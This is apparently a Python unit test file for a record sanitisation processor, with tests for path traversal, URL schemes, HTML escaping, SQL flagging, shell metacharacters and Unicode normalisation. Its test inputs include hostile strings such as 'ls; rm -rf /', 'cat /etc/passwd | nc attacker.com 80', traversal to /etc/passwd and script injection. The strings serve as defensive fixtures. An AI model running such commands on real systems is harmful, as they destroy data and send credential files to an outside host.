"""
tests/unit/test_layer1_sanitisation.py
=======================================

T-016 — Unit tests for SanitisationProcessor (WP-3.4, DL-031).

Permanent set member.  33 test cases covering:
  - Path sanitiser: dot-dot resolution, absolute-path rejection, separator
    normalisation
  - URL sanitiser: scheme allow-list, credential stripping
  - HTML sanitiser: script-tag stripping, angle-bracket escaping
  - SQL-payload flagger: SELECT / DROP / INSERT patterns flagged
  - Command sanitiser: shell metacharacter removal (;  &  |  $  `)
  - Unicode sanitiser: NFKC normalisation, zero-width character stripping
  - Critical-field bypass: CRITICAL_FIELDS values never passed through
    sanitisers
  - Clean record: no flags emitted, record unchanged
  - API shape: SanitisationResult, SanitisationFlag contracts
"""

from __future__ import annotations

import copy
import unittest
from typing import Any, Dict

from layers.layer1.sanitisation import (
    SanitisationFlag,
    SanitisationProcessor,
    SanitisationResult,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _base_record(**overrides: Any) -> Dict[str, Any]:
    base: Dict[str, Any] = {
        "record_id": "550e8400-e29b-41d4-a716-446655440000",
        "timestamp": 1_714_000_000.0,
        "function_name": "my-lambda",
        "execution_phase": "execution",
        "anomaly_type": "benign",
        "schema_version": "v2.1",
        "telemetry_data": {
            "l0_duration_ms": 42.0,
            "l0_memory_spike_kb": 128,
            "l0_cpu_utilization": 12.5,
            "l0_network_io_bytes": 1024,
            "l0_fallback_mode": False,
        },
        "context_metadata": {},
        "provenance_chain": {},
    }
    base.update(overrides)
    return base


PROC = SanitisationProcessor()


# ---------------------------------------------------------------------------
# API shape
# ---------------------------------------------------------------------------

class TestAPIShape(unittest.TestCase):

    def test_sanitise_returns_sanitisation_result(self):
        r = PROC.sanitise(_base_record())
        self.assertIsInstance(r, SanitisationResult)

    def test_sanitisation_result_has_sanitised_record(self):
        r = PROC.sanitise(_base_record())
        self.assertIsInstance(r.sanitised_record, dict)

    def test_sanitisation_result_has_flags(self):
        r = PROC.sanitise(_base_record())
        self.assertIsInstance(r.flags, list)

    def test_sanitisation_flag_has_field_path(self):
        rec = _base_record(context_metadata={"cmd": "ls; rm -rf /"})
        r = PROC.sanitise(rec)
        if r.flags:
            self.assertIsInstance(r.flags[0].field_path, str)

    def test_sanitisation_flag_has_sanitiser(self):
        rec = _base_record(context_metadata={"cmd": "ls; rm -rf /"})
        r = PROC.sanitise(rec)
        if r.flags:
            self.assertIsInstance(r.flags[0].sanitiser, str)


# ---------------------------------------------------------------------------
# Clean record
# ---------------------------------------------------------------------------

class TestCleanRecord(unittest.TestCase):

    def test_clean_record_no_flags(self):
        r = PROC.sanitise(_base_record())
        self.assertEqual(r.flags, [])

    def test_clean_record_sanitised_equals_original_for_clean_values(self):
        rec = _base_record()
        r = PROC.sanitise(rec)
        self.assertEqual(r.sanitised_record["execution_phase"], "execution")


# ---------------------------------------------------------------------------
# Path sanitiser
# ---------------------------------------------------------------------------

class TestPathSanitiser(unittest.TestCase):

    def test_dotdot_resolved(self):
        result = PROC._sanitize_path("foo/../../etc/passwd")
        self.assertNotIn("..", result)

    def test_absolute_rejected_when_disallow_abs(self):
        result = PROC._sanitize_path("/etc/passwd", disallow_abs=True)
        self.assertFalse(result.startswith("/"))

    def test_absolute_allowed_when_disallow_abs_false(self):
        result = PROC._sanitize_path("/safe/path", disallow_abs=False)
        # Must not raise and result must be non-empty
        self.assertTrue(len(result) > 0)

    def test_backslash_normalised_to_forward_slash(self):
        result = PROC._sanitize_path("foo\\bar\\baz")
        self.assertNotIn("\\", result)

    def test_clean_path_unchanged(self):
        result = PROC._sanitize_path("foo/bar/baz.txt")
        self.assertEqual(result, "foo/bar/baz.txt")


# ---------------------------------------------------------------------------
# URL sanitiser
# ---------------------------------------------------------------------------

class TestURLSanitiser(unittest.TestCase):

    def test_http_scheme_allowed(self):
        result = PROC._sanitize_url("http://example.com/path")
        self.assertIn("example.com", result)

    def test_https_scheme_allowed(self):
        result = PROC._sanitize_url("https://example.com/path")
        self.assertIn("example.com", result)

    def test_javascript_scheme_rejected(self):
        result = PROC._sanitize_url("javascript:alert(1)")
        self.assertNotIn("javascript", result.lower())

    def test_credentials_stripped(self):
        result = PROC._sanitize_url("https://user:secret@example.com/path")
        self.assertNotIn("secret", result)

    def test_clean_url_returns_non_empty(self):
        result = PROC._sanitize_url("https://example.com/api")
        self.assertTrue(len(result) > 0)


# ---------------------------------------------------------------------------
# HTML sanitiser
# ---------------------------------------------------------------------------

class TestHTMLSanitiser(unittest.TestCase):

    def test_script_tag_stripped(self):
        result = PROC._sanitize_html("<script>alert(1)</script>hello")
        self.assertNotIn("<script>", result)

    def test_angle_brackets_escaped(self):
        result = PROC._sanitize_html("<b>bold</b>")
        self.assertNotIn("<b>", result)

    def test_double_quotes_escaped(self):
        result = PROC._sanitize_html('say "hello"')
        self.assertIn("&quot;", result)

    def test_clean_string_escaped_safely(self):
        result = PROC._sanitize_html("hello world")
        self.assertEqual(result, "hello world")


# ---------------------------------------------------------------------------
# SQL-payload flagger
# ---------------------------------------------------------------------------

class TestSQLFlagger(unittest.TestCase):

    def test_select_statement_flagged(self):
        flagged = PROC._sanitize_sql("SELECT * FROM users")
        self.assertTrue(flagged)

    def test_drop_table_flagged(self):
        flagged = PROC._sanitize_sql("DROP TABLE sessions")
        self.assertTrue(flagged)

    def test_clean_string_not_flagged(self):
        flagged = PROC._sanitize_sql("normal log message")
        self.assertFalse(flagged)


# ---------------------------------------------------------------------------
# Command sanitiser
# ---------------------------------------------------------------------------

class TestCommandSanitiser(unittest.TestCase):

    def test_semicolon_stripped(self):
        result = PROC._sanitize_command("ls; rm -rf /")
        self.assertNotIn(";", result)

    def test_pipe_stripped(self):
        result = PROC._sanitize_command("cat /etc/passwd | nc attacker.com 80")
        self.assertNotIn("|", result)

    def test_dollar_stripped(self):
        result = PROC._sanitize_command("echo $HOME")
        self.assertNotIn("$", result)

    def test_backtick_stripped(self):
        result = PROC._sanitize_command("echo `id`")
        self.assertNotIn("`", result)

    def test_ampersand_stripped(self):
        result = PROC._sanitize_command("cmd1 && cmd2 &")
        self.assertNotIn("&", result)


# ---------------------------------------------------------------------------
# Unicode sanitiser
# ---------------------------------------------------------------------------

class TestUnicodeSanitiser(unittest.TestCase):

    def test_nfkc_normalisation_applied(self):
        # Fullwidth latin capital A (U+FF21) → regular A
        result = PROC._sanitize_unicode("\uff21")
        self.assertEqual(result, "A")

    def test_zero_width_chars_stripped(self):
        # Zero-width space U+200B
        result = PROC._sanitize_unicode("hello\u200bworld")
        self.assertNotIn("\u200b", result)

    def test_zero_width_non_joiner_stripped(self):
        # Zero-width non-joiner U+200C
        result = PROC._sanitize_unicode("hel\u200clo")
        self.assertNotIn("\u200c", result)

    def test_clean_ascii_unchanged(self):
        result = PROC._sanitize_unicode("hello world")
        self.assertEqual(result, "hello world")


# ---------------------------------------------------------------------------
# Critical-field bypass
# ---------------------------------------------------------------------------

class TestCriticalFieldBypass(unittest.TestCase):

    def test_critical_field_value_preserved_unchanged(self):
        # execution_phase is a CRITICAL_FIELD; even if it looks like HTML
        # it must pass through unsanitised
        rec = _base_record(execution_phase="execution")
        r = PROC.sanitise(rec)
        self.assertEqual(r.sanitised_record["execution_phase"], "execution")

    def test_non_critical_field_gets_sanitised(self):
        # A non-critical context_metadata field with command injection
        rec = _base_record(context_metadata={"user_input": "ls; rm -rf /"})
        r = PROC.sanitise(rec)
        sanitised_val = r.sanitised_record["context_metadata"]["user_input"]
        self.assertNotIn(";", sanitised_val)

    def test_original_record_not_mutated(self):
        rec = _base_record(context_metadata={"user_input": "ls; rm -rf /"})
        original_val = rec["context_metadata"]["user_input"]
        PROC.sanitise(rec)
        self.assertEqual(rec["context_metadata"]["user_input"], original_val)


if __name__ == "__main__":
    unittest.main()
